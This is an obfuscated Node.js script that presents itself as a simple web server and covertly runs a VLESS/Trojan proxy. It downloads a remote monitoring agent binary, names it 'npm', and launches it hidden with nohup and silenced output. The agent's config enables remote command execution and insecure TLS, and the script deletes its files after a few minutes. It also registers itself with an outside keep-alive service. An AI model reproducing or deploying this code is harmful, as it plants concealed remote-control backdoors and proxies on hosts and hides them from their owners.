function _0x4043(){const _0x5a5480=['axios','aarch64','data','6224wuKLQS','close','substr','catch','54VUCmdi',':443?security=tls&sni=','crypto','443','511qpzoUf','map','unlink','&type=A','arm64','2087','net','join','3084288jGcYia','client_secret:\x20','connect','child_process','decode','86745oThVeP','Automatic\x20Access\x20Task\x20added\x20successfully','Answer','utf8','log','2qvYEvA','readFile','digest','test','NAME','UUID','DOMAIN','readUInt8','text/html','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','text/plain','pipe','write','finish','&path=%2F','NEZHA_KEY','env','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','index.html','get','1234.abc.com','https://oooo.serv00.net/add-url','utf-8','split',':443?encryption=none&security=tls&sni=','arm','npm\x20is\x20running','/bin/bash','\x20with\x20all\x20DNS\x20servers','30088036jlEAMH','true','https://arm64.ssss.nyc.mn/agent','createHash','url','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','vless://','Server','country','npm','base64','https://amd64.ssss.nyc.mn/agent','NEZHA_SERVER','arch','error:\x20','Hug','slice','error','--tls','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','2083','stream','2096','Status','2053','every','NEZHA_PORT','reduce','createWriteStream','setsid\x20nohup\x20./npm\x20-s\x20','toString','post','length','end','trim','readUInt16BE','4750437UffigB','&fp=chrome&type=ws&host=','message','12VrvnqC','includes','concat','replace','WSPATH','writeHead','application/json','type','npm\x20download\x20successfully','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','https://','sub','1400941tsIFCC','sha224','AUTO_ACCESS','258810EwKHMP','chmod\x20+x\x20npm','send','hex','https://dns.google/resolve?name=','Server\x20is\x20running\x20on\x20port\x20','Failed\x20to\x20resolve\x20','then','212eZQwjv','listen','Hello\x20world!','application/dns-json','update','connection','PORT'];_0x4043=function(){return _0x5a5480;};return _0x4043();}const _0xbeef6f=_0x48bc;(function(_0x348115,_0x2a9c74){const _0x2f586c=_0x48bc,_0x50fcfa=_0x348115();while(!![]){try{const _0x51c444=parseInt(_0x2f586c(0x108))/0x1*(parseInt(_0x2f586c(0x137))/0x2)+-parseInt(_0x2f586c(0xf9))/0x3+parseInt(_0x2f586c(0x113))/0x4*(-parseInt(_0x2f586c(0x132))/0x5)+-parseInt(_0x2f586c(0x12d))/0x6+parseInt(_0x2f586c(0x125))/0x7*(-parseInt(_0x2f586c(0x11d))/0x8)+parseInt(_0x2f586c(0x121))/0x9*(-parseInt(_0x2f586c(0x10b))/0xa)+-parseInt(_0x2f586c(0xd5))/0xb*(-parseInt(_0x2f586c(0xfc))/0xc);if(_0x51c444===_0x2a9c74)break;else _0x50fcfa['push'](_0x50fcfa['shift']());}catch(_0x3ed9b4){_0x50fcfa['push'](_0x50fcfa['shift']());}}}(_0x4043,0xdd769));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0xbeef6f(0x11a)),net=require(_0xbeef6f(0x12b)),path=require('path'),crypto=require(_0xbeef6f(0x123)),{Buffer}=require('buffer'),{exec,execSync}=require(_0xbeef6f(0x130)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0xbeef6f(0x13c)]||'8e56f623-4c60-43d8-82eb-ae5a981c50b5',NEZHA_SERVER=process[_0xbeef6f(0x147)][_0xbeef6f(0xe1)]||'',NEZHA_PORT=process[_0xbeef6f(0x147)][_0xbeef6f(0xef)]||'',NEZHA_KEY=process[_0xbeef6f(0x147)][_0xbeef6f(0x146)]||'',DOMAIN=process['env'][_0xbeef6f(0x13d)]||_0xbeef6f(0x14b),AUTO_ACCESS=process[_0xbeef6f(0x147)][_0xbeef6f(0x10a)]||!![],WSPATH=process[_0xbeef6f(0x147)][_0xbeef6f(0x100)]||UUID[_0xbeef6f(0xe5)](0x0,0x8),SUB_PATH=process[_0xbeef6f(0x147)]['SUB_PATH']||_0xbeef6f(0x107),NAME=process['env'][_0xbeef6f(0x13b)]||_0xbeef6f(0xe4),PORT=process[_0xbeef6f(0x147)][_0xbeef6f(0x119)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x7130c6=_0xbeef6f;try{const _0x251a97=await axios[_0x7130c6(0x14a)]('https://speed.cloudflare.com/meta'),_0x5b39f5=_0x251a97[_0x7130c6(0x11c)];ISP=(_0x5b39f5[_0x7130c6(0xdd)]+'-'+_0x5b39f5['asOrganization'])[_0x7130c6(0xff)](/ /g,'_');}catch(_0x3ff27f){ISP='Unknown';}};GetISP();const httpServer=http['createServer']((_0x2b976d,_0x3ac813)=>{const _0x2ce035=_0xbeef6f;if(_0x2b976d['url']==='/'){const _0x50f3c4=path[_0x2ce035(0x12c)](__dirname,_0x2ce035(0x149));fs[_0x2ce035(0x138)](_0x50f3c4,_0x2ce035(0x135),(_0x4fb881,_0x538026)=>{const _0x300406=_0x2ce035;if(_0x4fb881){_0x3ac813[_0x300406(0x101)](0xc8,{'Content-Type':_0x300406(0x13f)}),_0x3ac813[_0x300406(0xf6)](_0x300406(0x115));return;}_0x3ac813[_0x300406(0x101)](0xc8,{'Content-Type':_0x300406(0x13f)}),_0x3ac813[_0x300406(0xf6)](_0x538026);});return;}else{if(_0x2b976d[_0x2ce035(0xd9)]==='/'+SUB_PATH){const _0x49102e=_0x2ce035(0xdb)+UUID+'@'+DOMAIN+_0x2ce035(0xd0)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x2ce035(0x145)+WSPATH+'#'+NAME+'-'+ISP,_0x199b90='trojan://'+UUID+'@'+DOMAIN+_0x2ce035(0x122)+DOMAIN+_0x2ce035(0xfa)+DOMAIN+_0x2ce035(0x145)+WSPATH+'#'+NAME+'-'+ISP,_0x36da16=_0x49102e+'\x0a'+_0x199b90,_0x6c2ed7=Buffer['from'](_0x36da16)[_0x2ce035(0xf3)](_0x2ce035(0xdf));_0x3ac813[_0x2ce035(0x101)](0xc8,{'Content-Type':_0x2ce035(0x141)}),_0x3ac813[_0x2ce035(0xf6)](_0x6c2ed7+'\x0a');}else _0x3ac813[_0x2ce035(0x101)](0x194,{'Content-Type':_0x2ce035(0x141)}),_0x3ac813[_0x2ce035(0xf6)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0xbeef6f(0xdc))]({'server':httpServer}),uuid=UUID[_0xbeef6f(0xff)](/-/g,''),DNS_SERVERS=['8.8.4.4','1.1.1.1'];function resolveHost(_0x308254){return new Promise((_0x12168e,_0x3c8ae4)=>{const _0x1f12df=_0x48bc;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x1f12df(0x13a)](_0x308254)){_0x12168e(_0x308254);return;}let _0xb2c209=0x0;function _0x11a977(){const _0x45f24b=_0x1f12df;if(_0xb2c209>=DNS_SERVERS[_0x45f24b(0xf5)]){_0x3c8ae4(new Error(_0x45f24b(0x111)+_0x308254+_0x45f24b(0xd4)));return;}const _0x5001e2=DNS_SERVERS[_0xb2c209];_0xb2c209++;const _0x389a69=_0x45f24b(0x10f)+encodeURIComponent(_0x308254)+_0x45f24b(0x128);axios['get'](_0x389a69,{'timeout':0x1388,'headers':{'Accept':_0x45f24b(0x116)}})[_0x45f24b(0x112)](_0x46c12f=>{const _0x434fe5=_0x45f24b,_0x67bd3f=_0x46c12f['data'];if(_0x67bd3f[_0x434fe5(0xec)]===0x0&&_0x67bd3f['Answer']&&_0x67bd3f[_0x434fe5(0x134)][_0x434fe5(0xf5)]>0x0){const _0x574c42=_0x67bd3f[_0x434fe5(0x134)]['find'](_0x259cb1=>_0x259cb1[_0x434fe5(0x103)]===0x1);if(_0x574c42){_0x12168e(_0x574c42[_0x434fe5(0x11c)]);return;}}_0x11a977();})[_0x45f24b(0x120)](_0x72c7d3=>{_0x11a977();});}_0x11a977();});}function handleVlessConnection(_0x5bd751,_0x16b833){const _0x9f0c36=_0xbeef6f,[_0x3679da]=_0x16b833,_0x1064be=_0x16b833['slice'](0x1,0x11);if(!_0x1064be[_0x9f0c36(0xee)]((_0x29aaca,_0x42860e)=>_0x29aaca==parseInt(uuid[_0x9f0c36(0x11f)](_0x42860e*0x2,0x2),0x10)))return![];let _0x406aa6=_0x16b833['slice'](0x11,0x12)['readUInt8']()+0x13;const _0x3ecf93=_0x16b833[_0x9f0c36(0xe5)](_0x406aa6,_0x406aa6+=0x2)[_0x9f0c36(0xf8)](0x0),_0x398214=_0x16b833['slice'](_0x406aa6,_0x406aa6+=0x1)[_0x9f0c36(0x13e)](),_0x468621=_0x398214==0x1?_0x16b833[_0x9f0c36(0xe5)](_0x406aa6,_0x406aa6+=0x4)['join']('.'):_0x398214==0x2?new TextDecoder()[_0x9f0c36(0x131)](_0x16b833[_0x9f0c36(0xe5)](_0x406aa6+0x1,_0x406aa6+=0x1+_0x16b833['slice'](_0x406aa6,_0x406aa6+0x1)['readUInt8']())):_0x398214==0x3?_0x16b833[_0x9f0c36(0xe5)](_0x406aa6,_0x406aa6+=0x10)[_0x9f0c36(0xf0)]((_0x48a2cc,_0x23bd4a,_0x145a6a,_0x476149)=>_0x145a6a%0x2?_0x48a2cc['concat'](_0x476149[_0x9f0c36(0xe5)](_0x145a6a-0x1,_0x145a6a+0x1)):_0x48a2cc,[])['map'](_0x5455d8=>_0x5455d8[_0x9f0c36(0xf8)](0x0)[_0x9f0c36(0xf3)](0x10))['join'](':'):'';_0x5bd751[_0x9f0c36(0x10d)](new Uint8Array([_0x3679da,0x0]));const _0x3b5e7f=createWebSocketStream(_0x5bd751);return resolveHost(_0x468621)['then'](_0x28db3a=>{const _0x4b6938=_0x9f0c36;net[_0x4b6938(0x12f)]({'host':_0x28db3a,'port':_0x3ecf93},function(){const _0x4d55de=_0x4b6938;this[_0x4d55de(0x143)](_0x16b833[_0x4d55de(0xe5)](_0x406aa6)),_0x3b5e7f['on']('error',()=>{})['pipe'](this)['on'](_0x4d55de(0xe6),()=>{})[_0x4d55de(0x142)](_0x3b5e7f);})['on'](_0x4b6938(0xe6),()=>{});})[_0x9f0c36(0x120)](_0x40b7b7=>{const _0x6d1ccf=_0x9f0c36;net[_0x6d1ccf(0x12f)]({'host':_0x468621,'port':_0x3ecf93},function(){const _0x4d6515=_0x6d1ccf;this[_0x4d6515(0x143)](_0x16b833[_0x4d6515(0xe5)](_0x406aa6)),_0x3b5e7f['on'](_0x4d6515(0xe6),()=>{})['pipe'](this)['on']('error',()=>{})[_0x4d6515(0x142)](_0x3b5e7f);})['on'](_0x6d1ccf(0xe6),()=>{});}),!![];}function handleTrojanConnection(_0x364aed,_0x340d60){const _0xd82274=_0xbeef6f;try{if(_0x340d60['length']<0x3a)return![];const _0x1537e9=_0x340d60[_0xd82274(0xe5)](0x0,0x38)[_0xd82274(0xf3)](),_0xcd1365=[UUID];let _0x29f72b=null;for(const _0x2823ba of _0xcd1365){const _0xbda979=crypto[_0xd82274(0xd8)](_0xd82274(0x109))[_0xd82274(0x117)](_0x2823ba)[_0xd82274(0x139)](_0xd82274(0x10e));if(_0xbda979===_0x1537e9){_0x29f72b=_0x2823ba;break;}}if(!_0x29f72b)return![];let _0xf4a08=0x38;_0x340d60[_0xf4a08]===0xd&&_0x340d60[_0xf4a08+0x1]===0xa&&(_0xf4a08+=0x2);const _0x3432f9=_0x340d60[_0xf4a08];if(_0x3432f9!==0x1)return![];_0xf4a08+=0x1;const _0xa67c9e=_0x340d60[_0xf4a08];_0xf4a08+=0x1;let _0x4125bf,_0x1682c6;if(_0xa67c9e===0x1)_0x4125bf=_0x340d60[_0xd82274(0xe5)](_0xf4a08,_0xf4a08+0x4)[_0xd82274(0x12c)]('.'),_0xf4a08+=0x4;else{if(_0xa67c9e===0x3){const _0x20c766=_0x340d60[_0xf4a08];_0xf4a08+=0x1,_0x4125bf=_0x340d60[_0xd82274(0xe5)](_0xf4a08,_0xf4a08+_0x20c766)[_0xd82274(0xf3)](),_0xf4a08+=_0x20c766;}else{if(_0xa67c9e===0x4)_0x4125bf=_0x340d60['slice'](_0xf4a08,_0xf4a08+0x10)[_0xd82274(0xf0)]((_0x4b63eb,_0x40bb21,_0x3abbb8,_0x489733)=>_0x3abbb8%0x2?_0x4b63eb[_0xd82274(0xfe)](_0x489733[_0xd82274(0xe5)](_0x3abbb8-0x1,_0x3abbb8+0x1)):_0x4b63eb,[])[_0xd82274(0x126)](_0x1f1129=>_0x1f1129[_0xd82274(0xf8)](0x0)['toString'](0x10))[_0xd82274(0x12c)](':'),_0xf4a08+=0x10;else return![];}}_0x1682c6=_0x340d60['readUInt16BE'](_0xf4a08),_0xf4a08+=0x2;_0xf4a08<_0x340d60[_0xd82274(0xf5)]&&_0x340d60[_0xf4a08]===0xd&&_0x340d60[_0xf4a08+0x1]===0xa&&(_0xf4a08+=0x2);const _0x1da5c1=createWebSocketStream(_0x364aed);return resolveHost(_0x4125bf)[_0xd82274(0x112)](_0x49ce38=>{net['connect']({'host':_0x49ce38,'port':_0x1682c6},function(){const _0x743ac5=_0x48bc;_0xf4a08<_0x340d60[_0x743ac5(0xf5)]&&this[_0x743ac5(0x143)](_0x340d60[_0x743ac5(0xe5)](_0xf4a08)),_0x1da5c1['on'](_0x743ac5(0xe6),()=>{})[_0x743ac5(0x142)](this)['on']('error',()=>{})[_0x743ac5(0x142)](_0x1da5c1);})['on']('error',()=>{});})['catch'](_0x5ccbd3=>{const _0x7e0c1b=_0xd82274;net[_0x7e0c1b(0x12f)]({'host':_0x4125bf,'port':_0x1682c6},function(){const _0x1f2de0=_0x7e0c1b;_0xf4a08<_0x340d60['length']&&this[_0x1f2de0(0x143)](_0x340d60[_0x1f2de0(0xe5)](_0xf4a08)),_0x1da5c1['on'](_0x1f2de0(0xe6),()=>{})[_0x1f2de0(0x142)](this)['on']('error',()=>{})[_0x1f2de0(0x142)](_0x1da5c1);})['on'](_0x7e0c1b(0xe6),()=>{});}),!![];}catch(_0x4c649c){return![];}}wss['on'](_0xbeef6f(0x118),(_0x5be12e,_0x123d5e)=>{const _0x485701=_0xbeef6f,_0x27b4f7=_0x123d5e[_0x485701(0xd9)]||'';_0x5be12e['once'](_0x485701(0xfb),_0x1bed05=>{const _0x503817=_0x485701;if(_0x1bed05[_0x503817(0xf5)]>0x11&&_0x1bed05[0x0]===0x0){const _0x306637=_0x1bed05[_0x503817(0xe5)](0x1,0x11),_0xb03464=_0x306637['every']((_0x3e35b6,_0x528f6f)=>_0x3e35b6==parseInt(uuid[_0x503817(0x11f)](_0x528f6f*0x2,0x2),0x10));if(_0xb03464){!handleVlessConnection(_0x5be12e,_0x1bed05)&&_0x5be12e[_0x503817(0x11e)]();return;}}!handleTrojanConnection(_0x5be12e,_0x1bed05)&&_0x5be12e[_0x503817(0x11e)]();})['on'](_0x485701(0xe6),()=>{});});const getDownloadUrl=()=>{const _0x1d9234=_0xbeef6f,_0x76c231=os[_0x1d9234(0xe2)]();return _0x76c231===_0x1d9234(0xd1)||_0x76c231===_0x1d9234(0x129)||_0x76c231===_0x1d9234(0x11b)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x1d9234(0xd7):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x1d9234(0xe0);},downloadFile=async()=>{const _0x5310f6=_0xbeef6f;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x4007b2=getDownloadUrl(),_0x1faa6f=await axios({'method':_0x5310f6(0x14a),'url':_0x4007b2,'responseType':_0x5310f6(0xea)}),_0x37598c=fs[_0x5310f6(0xf1)](_0x5310f6(0xde));return _0x1faa6f[_0x5310f6(0x11c)][_0x5310f6(0x142)](_0x37598c),new Promise((_0x1debdc,_0x3e5145)=>{const _0x266d0e=_0x5310f6;_0x37598c['on'](_0x266d0e(0x144),()=>{const _0x306d0c=_0x266d0e;console['log'](_0x306d0c(0x104)),exec(_0x306d0c(0x10c),_0x49d56f=>{if(_0x49d56f)_0x3e5145(_0x49d56f);_0x1debdc();});}),_0x37598c['on']('error',_0x3e5145);});}catch(_0x4fc953){throw _0x4fc953;}},runnz=async()=>{const _0x25f1c6=_0xbeef6f;try{const _0x20fb23=execSync(_0x25f1c6(0xe8),{'encoding':_0x25f1c6(0x14d)});if(_0x20fb23[_0x25f1c6(0xf7)]()!==''){console[_0x25f1c6(0x136)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0xf99987){}await downloadFile();let _0x336653='',_0x1f1754=[_0x25f1c6(0x124),'8443',_0x25f1c6(0xeb),_0x25f1c6(0x12a),_0x25f1c6(0xe9),_0x25f1c6(0xed)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0xa82673=_0x1f1754[_0x25f1c6(0xfd)](NEZHA_PORT)?_0x25f1c6(0xe7):'';_0x336653=_0x25f1c6(0xf2)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0xa82673+_0x25f1c6(0x105);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x461123=NEZHA_SERVER[_0x25f1c6(0xfd)](':')?NEZHA_SERVER[_0x25f1c6(0x14e)](':')['pop']():'',_0x5d5d57=_0x1f1754['includes'](_0x461123)?_0x25f1c6(0xd6):'false',_0x3875e2=_0x25f1c6(0x12e)+NEZHA_KEY+_0x25f1c6(0x140)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x5d5d57+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync']('config.yaml',_0x3875e2);}_0x336653=_0x25f1c6(0xda);}else{console[_0x25f1c6(0x136)](_0x25f1c6(0x148));return;}}try{exec(_0x336653,{'shell':_0x25f1c6(0xd3)},_0x1ed6f5=>{const _0xca63fe=_0x25f1c6;if(_0x1ed6f5)console[_0xca63fe(0xe6)]('npm\x20running\x20error:',_0x1ed6f5);else console[_0xca63fe(0x136)](_0xca63fe(0xd2));});}catch(_0x3fd299){console[_0x25f1c6(0xe6)](_0x25f1c6(0xe3)+_0x3fd299);}};async function addAccessTask(){const _0x37acc5=_0xbeef6f;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x3f30f5=_0x37acc5(0x106)+DOMAIN+'/'+SUB_PATH;try{const _0x95452f=await axios[_0x37acc5(0xf4)](_0x37acc5(0x14c),{'url':_0x3f30f5},{'headers':{'Content-Type':_0x37acc5(0x102)}});console[_0x37acc5(0x136)](_0x37acc5(0x133));}catch(_0x4d6479){}}function _0x48bc(_0x37cde1,_0x5b0dcf){const _0x40431c=_0x4043();return _0x48bc=function(_0x48bc17,_0x3c3081){_0x48bc17=_0x48bc17-0xd0;let _0x403f4a=_0x40431c[_0x48bc17];return _0x403f4a;},_0x48bc(_0x37cde1,_0x5b0dcf);}const delFiles=()=>{const _0x535e3d=_0xbeef6f;fs[_0x535e3d(0x127)]('npm',()=>{}),fs[_0x535e3d(0x127)]('config.yaml',()=>{});};httpServer[_0xbeef6f(0x114)](PORT,()=>{const _0x462147=_0xbeef6f;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x462147(0x136)](_0x462147(0x110)+PORT);});
